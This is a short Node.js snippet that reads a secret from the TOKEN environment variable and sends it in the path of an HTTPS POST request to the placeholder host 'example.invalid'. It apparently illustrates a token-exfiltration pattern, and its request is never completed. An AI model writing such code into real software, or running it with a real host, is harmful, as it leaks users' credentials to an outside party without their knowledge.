const https = require("https");

const token = process.env.TOKEN;

https.request(
    {
        hostname: "example.invalid",
        path: token,
        method: "POST"
    }
);